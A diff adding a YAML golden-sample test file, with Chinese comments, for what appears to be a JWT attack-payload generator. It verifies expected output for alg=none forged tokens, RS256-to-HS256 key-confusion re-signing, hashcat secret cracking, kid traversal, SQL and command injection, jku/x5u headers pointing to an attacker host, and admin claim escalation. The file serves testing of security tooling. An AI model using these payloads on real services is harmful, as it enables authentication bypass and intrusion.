@@ -1,0 +1,203 @@
+# JWT 黄金样本。
+#
+# 这批断言的重点是 js/json 两种内容类型的分界（header / payload 片段走 json，运行期会真做
+# 语法校验；拼好的整串 token 走 raw，没有 parser）以及**槽位→变量两阶段的求值顺序**——
+# none.token / none.two_segment 的头段来自槽位算好的 base64url、载荷段来自变量，
+# jwk.header 的嵌套密钥 JSON 更是「槽位值里嵌变量」，顺序反了就全错。
+#
+# 期望值全部按 body 手推：先填槽位、再替变量，逐字符写下来。头段的 base64url 段
+# 单独用 base64 解过一遍确认解出来是那份 header JSON。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= alg=none =================
+
+  - name: alg=none 头部（混合大小写）
+    state:
+      vuln: jwt
+      template: jwt.generic.none.header
+      slots: {alg: none-mixed}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"nOnE","typ":"JWT"}'
+      syntax: ok
+
+  - name: alg=none 空签名 token（签名段留空、点号保留）
+    state:
+      vuln: jwt
+      template: jwt.generic.none.token
+      slots: {alg: none}
+      vars: {claims: "eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ"}
+      outputs: [raw]
+    expect:
+      # 头段是 {"alg":"none","typ":"JWT"} 的 base64url；claims 段是
+      # {"sub":"admin","admin":true} 的 base64url（两段都独立解码核对过）
+      payload: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.
+
+  - name: alg=none 两段畸形 token（点号一起去掉）
+    state:
+      vuln: jwt
+      template: jwt.generic.none.two_segment
+      slots: {alg: none-upper}
+      vars: {claims: "eyJzdWIiOiJhZG1pbiJ9"}
+      outputs: [raw]
+    expect:
+      # 头段是 {"alg":"NONE","typ":"JWT"} 的 base64url；claims 段是 {"sub":"admin"}
+      payload: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9
+
+  # ================= 算法混淆 RS256 -> HS256 =================
+
+  - name: RS256 降级 HS256 头部
+    state:
+      vuln: jwt
+      template: jwt.generic.confusion.header
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"HS256","typ":"JWT"}'
+      syntax: ok
+
+  - name: RS256 降级 HS256 本地重签（公钥字节当 HMAC 密钥）
+    state:
+      vuln: jwt
+      template: jwt.generic.confusion.resign
+      vars: {pubkey: "pub.pem", token: "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9"}
+      outputs: [raw]
+    expect:
+      payload: "printf '%s' \"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(xxd -p -c 100000 pub.pem) -binary | openssl base64 -A | tr '+/' '-_' | tr -d '='"
+      syntax: unchecked
+
+  # ================= 弱密钥 =================
+
+  - name: HS256 弱密钥爆破（hashcat -m 16500）
+    state:
+      vuln: jwt
+      template: jwt.generic.weak.crack
+      vars: {token: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abc"}
+      outputs: [raw]
+    expect:
+      payload: "hashcat -m 16500 -a 0 eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abc /usr/share/wordlists/rockyou.txt"
+      syntax: unchecked
+
+  - name: HS256 弱密钥重签（槽位取值 changeme）
+    state:
+      vuln: jwt
+      template: jwt.generic.weak.resign
+      slots: {secret: changeme}
+      vars: {token: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9"}
+      outputs: [raw]
+    expect:
+      payload: "printf '%s' \"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9\" | openssl dgst -sha256 -mac HMAC -macopt key:changeme -binary | openssl base64 -A | tr '+/' '-_' | tr -d '='"
+      syntax: unchecked
+
+  # ================= kid 注入 =================
+
+  - name: kid 路径穿越到 /dev/null
+    state:
+      vuln: jwt
+      template: jwt.generic.kid.traversal
+      slots: {kid: "../../../../../../dev/null"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}'
+      syntax: ok
+
+  - name: kid SQL 注入（UNION 换密钥）
+    state:
+      vuln: jwt
+      template: jwt.generic.kid.sqli
+      outputs: [raw]
+    expect:
+      payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"x' UNION SELECT 'known-secret'-- -\"}"
+      syntax: ok
+
+  - name: kid 命令注入（变量 cmd 落在 JSON 字符串里）
+    state:
+      vuln: jwt
+      template: jwt.generic.kid.cmd
+      vars: {cmd: "id"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"HS256","typ":"JWT","kid":"|id"}'
+      syntax: ok
+
+  # ================= jku / x5u =================
+
+  - name: jku 指向攻击者托管的 JWKS
+    state:
+      vuln: jwt
+      template: jwt.generic.jku.header
+      vars: {kid: "attacker", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"RS256","typ":"JWT","kid":"attacker","jku":"http://10.0.0.1/jwks.json"}'
+      syntax: ok
+
+  - name: 攻击者托管的 JWKS（模数用占位值）
+    state:
+      vuln: jwt
+      template: jwt.generic.jku.jwks
+      # modulus 只被逐字节替换，样本里给个短占位值就行，真实模数是 342 字符的 base64url
+      vars: {kid: "attacker", modulus: "AAAA"}
+      outputs: [raw]
+    expect:
+      payload: '{"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":"AAAA","e":"AQAB"}]}'
+      syntax: ok
+
+  - name: x5u 指向自签证书
+    state:
+      vuln: jwt
+      template: jwt.generic.x5u.header
+      vars: {kid: "attacker", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: '{"alg":"RS256","typ":"JWT","kid":"attacker","x5u":"http://10.0.0.1/cert.pem"}'
+      syntax: ok
+
+  # ================= jwk 头注入：alg 必须与 kty 配套 =================
+
+  - name: jwk 头注入（RSA 公钥 / RS256）
+    state:
+      vuln: jwt
+      template: jwt.generic.jwk.header
+      slots: {jwk: rsa}
+      vars: {kid: "attacker", modulus: "AAAA"}
+      outputs: [raw]
+    expect:
+      # 槽位字段里的 <<kid>> 是变量替换阶段才求值的，头里的 kid 和 jwk 里的 kid 都要被替换
+      payload: '{"alg":"RS256","typ":"JWT","kid":"attacker","jwk":{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":"AAAA","e":"AQAB"}}'
+      syntax: ok
+
+  - name: jwk 头注入（对称密钥 / HS256）
+    state:
+      vuln: jwt
+      template: jwt.generic.jwk.header
+      slots: {jwk: oct}
+      vars: {kid: "attacker", secret: "s3cr3t"}
+      outputs: [raw]
+    expect:
+      # oct 选项的密钥 JSON 里没有 <<modulus>>，所以没填的它不会在载荷里留下字面量
+      payload: '{"alg":"HS256","typ":"JWT","kid":"attacker","jwk":{"kty":"oct","alg":"HS256","k":"s3cr3t"}}'
+      syntax: ok
+
+  # ================= claims 片段 =================
+
+  - name: claims 提权片段
+    state:
+      vuln: jwt
+      template: jwt.generic.claims.privilege
+      vars: {subject: "admin"}
+      outputs: [raw]
+    expect:
+      payload: '{"sub":"admin","admin":true}'
+      syntax: ok
+
+  - name: claims 过期时间推到远期
+    state:
+      vuln: jwt
+      template: jwt.generic.claims.exp_future
+      vars: {subject: "admin"}
+      outputs: [raw]
+    expect:
+      payload: '{"sub":"admin","exp":9999999999}'
+      syntax: ok
